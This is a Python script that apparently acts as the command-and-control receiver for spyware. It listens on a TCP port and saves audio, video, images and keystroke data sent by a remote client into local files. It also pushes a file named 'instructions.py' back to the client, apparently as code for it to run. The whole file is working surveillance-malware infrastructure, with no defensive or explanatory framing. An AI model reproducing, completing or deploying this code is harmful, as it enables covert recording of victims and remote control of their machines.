#!/usr/bin/env python3

from scipy.io import wavfile
import numpy as np
import socket as s


class Receiver:
    """Method used to write an audio record"""
    @staticmethod
    def writeAudio(data):     
        #Write received data
        wavfile.write("output.wav", 44100, np.frombuffer(data, dtype="int16"))
        
    """Method used to write an image"""
    @staticmethod
    def recordImage(data):
        #Write received data
        binFile = open("output.png", "wb")
        binFile.write(data)
        binFile.close()   
        
    """Method used to write a video record"""
    @staticmethod
    def writeVideo(data):
        #Write received data
        binFile = open("output.mp4", "wb")
        binFile.write(data)
        binFile.close()
    
    """Method used to write keystrokes"""
    @staticmethod
    def writeKeys(data):
        print("Not implemented")
        
    """Method used to send instructions to the client"""
    @staticmethod
    def sendInstructions(c):
        #Send the instructions to the client
        txt = open("instructions.py", "r").read().encode()
        c.sendall(txt)
        c.sendall(b'kill')
        

    """Method used to receive data through a socket"""
    @staticmethod
    def receive():
        #Switcher used to call the correct function according to the type of data that will be received
        switcher = {
            b'1': Receiver.writeAudio,
            b'2': Receiver.writeVideo,
            b'3': Receiver.writeKeys,
            b'4': Receiver.recordImage,
            b'5': Receiver.sendInstructions
        }
        HOST = s.gethostbyname(s.gethostname()) #Translate a host name to IPv4
        PORT = 6969 
    
        #Create a socket bound to the 6969 port
        sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        
        #Listen to the port
        sock.bind((HOST, PORT))
        sock.listen(1)
        
        #Wait for incoming communications
        while True:
            try:
                receivedData = b''
                
                conn, addr = sock.accept()
                funct = switcher[conn.recv(1)]
                
                if funct == Receiver.sendInstructions:
                    funct(conn)
                else:
                    data = conn.recv(1024)
                    
                    while data:
                        receivedData += data
                        data = conn.recv(1024)
                        
                    print("Data received")
                    funct(receivedData)
                conn.close()
                
            #Unexpected data received
            except KeyError:
                conn.close()
                continue
            
            #CTRL-C to stop the server
            except KeyboardInterrupt:
                print("\nTerminating")
                break
            
        #Close the socket
        # try:
            # sock.shutdown(s.SHUT_RDWR)
        sock.close()
        # except OSError:
        #     pass
            
            
Receiver.receive()
